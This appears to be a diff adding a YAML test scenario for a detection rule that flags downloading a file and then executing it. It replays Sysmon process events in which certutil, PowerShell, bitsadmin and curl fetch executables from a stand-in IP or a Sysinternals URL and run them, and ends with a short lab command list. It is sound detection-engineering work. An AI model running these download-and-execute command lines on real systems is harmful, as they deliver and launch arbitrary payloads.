@@ -1,0 +1,36 @@
+scenario: SCE_Exec_Download_Then_Execute
+cases:
+  - name: positive_certutil_then_public_exe
+    expect_incidents: [exec_download_then_execute]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\certutil.exe', OriginalFileName: CertUtil.exe, CommandLine: 'certutil -urlcache -split -f http://203.0.113.50/p.exe C:\Users\Public\p.exe', ParentImage: 'C:\Windows\System32\cmd.exe', ProcessGuid: "${guid1}"}
+      - at: 60
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\Public\p.exe', CommandLine: 'C:\Users\Public\p.exe', ParentImage: 'C:\Windows\System32\cmd.exe', ProcessGuid: "${guid2}"}
+  - name: positive_iwr_to_temp_then_run
+    expect_incidents: [exec_download_then_execute]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell Invoke-WebRequest -Uri http://203.0.113.50/t.exe -OutFile $env:TEMP\t.exe', ParentImage: 'C:\Windows\explorer.exe'}
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell iwr -Uri http://203.0.113.50/t.exe -o C:\Users\victim\AppData\Local\Temp\t.exe', ParentImage: 'C:\Windows\explorer.exe'}
+      - at: 200
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\victim\AppData\Local\Temp\t.exe', ParentImage: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'}
+  - name: negative_execution_before_download
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\Public\p.exe', ParentImage: 'C:\Windows\explorer.exe'}
+      - at: 120
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\certutil.exe', OriginalFileName: CertUtil.exe, CommandLine: 'certutil -urlcache -f http://203.0.113.50/p.exe C:\Users\Public\p.exe'}
+  - name: negative_execution_beyond_window
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\bitsadmin.exe', OriginalFileName: bitsadmin.exe, CommandLine: 'bitsadmin /transfer j http://203.0.113.50/p.exe C:\Users\Public\p.exe'}
+      - at: 1200
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Users\Public\p.exe', ParentImage: 'C:\Windows\explorer.exe'}
+  - name: negative_execution_from_program_files
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\curl.exe', CommandLine: 'curl -O http://203.0.113.50/setup.msi'}
+      - at: 60
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Program Files\Tool\tool.exe', ParentImage: 'C:\Windows\explorer.exe'}
+lab:
+  - 'certutil -urlcache -split -f https://live.sysinternals.com/whoami.exe C:\Users\Public\w.exe'
+  - 'C:\Users\Public\w.exe'
